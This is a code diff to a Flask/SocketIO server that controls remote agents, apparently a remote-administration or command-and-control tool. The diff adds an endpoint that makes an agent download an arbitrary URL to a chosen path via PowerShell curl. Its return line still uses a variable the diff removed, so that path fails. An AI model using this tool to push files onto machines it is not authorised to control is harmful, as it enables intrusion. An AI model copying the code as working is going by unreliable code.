@@ -4344,11 +4344,16 @@ def upload_file_pscurl(agent_id):
             dst_dir = ''
         dst_sep = '\\' if (dst_dir and (dst_dir.startswith('\\') or ':' in dst_dir)) else '/'
         download_path = (dst_dir + (dst_sep if not dst_dir.endswith(dst_sep) and dst_dir != '' else '')) + safe_name if dst_dir else safe_name
-        # Compose PowerShell curl command
-        ps_cmd = f'curl.exe -L "{file_url}" -o "{download_path}"'
-        # Send execute_command to agent
+        # Ask agent to download via PowerShell curl with progress
         try:
-            socketio.emit('execute_command', {'agent_id': agent_id, 'command': ps_cmd, 'execution_id': f"exec_{upload_id}"}, room=agent_sid)
+            socketio.emit('ps_curl_download', {
+                'agent_id': agent_id,
+                'upload_id': upload_id,
+                'url': file_url,
+                'download_path': download_path,
+                'filename': safe_name,
+                'expected_size': os.path.getsize(temp_path)
+            }, room=agent_sid)
         except Exception:
             pass
         # Notify operator
@@ -4367,6 +4372,48 @@ def upload_file_pscurl(agent_id):
         return jsonify({'success': True, 'upload_id': upload_id, 'filename': safe_name, 'staged_url': file_url, 'destination_path': download_path, 'command': ps_cmd})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/agents/<agent_id>/files/download_url', methods=['POST'])
+@require_auth
+def download_url_to_agent(agent_id):
+    """Ask agent to download an external URL via PowerShell curl.exe"""
+    if agent_id not in AGENTS_DATA:
+        return jsonify({'error': 'Agent not found'}), 404
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return jsonify({'error': 'Agent not connected'}), 400
+    try:
+        data = request.get_json(force=True) or {}
+    except Exception:
+        data = {}
+    url = str(data.get('url') or '')
+    destination = str(data.get('destination') or '')
+    filename = os.path.basename(str(data.get('filename') or ''))
+    if not url:
+        return jsonify({'error': 'URL required'}), 400
+    upload_id = f"url_{int(time.time())}_{secrets.token_hex(4)}"
+    # Try to get expected size via HEAD from controller (best-effort)
+    expected_size = 0
+    try:
+        import requests  # best-effort if available
+        r = requests.head(url, timeout=10, allow_redirects=True)
+        cl = r.headers.get('Content-Length') or ''
+        if cl.isdigit():
+            expected_size = int(cl)
+    except Exception:
+        expected_size = 0
+    try:
+        socketio.emit('ps_curl_download', {
+            'agent_id': agent_id,
+            'upload_id': upload_id,
+            'url': url,
+            'download_path': destination and os.path.join(destination, filename) if filename else destination,
+            'filename': filename or os.path.basename(url.split('?')[0] or 'download.bin'),
+            'expected_size': expected_size
+        }, room=agent_sid)
+    except Exception:
+        pass
+    return jsonify({'success': True, 'upload_id': upload_id, 'url': url, 'destination': destination, 'filename': filename, 'expected_size': expected_size})
 
 @app.route('/api/agents/<agent_id>/files/stream', methods=['GET'])
 @require_auth
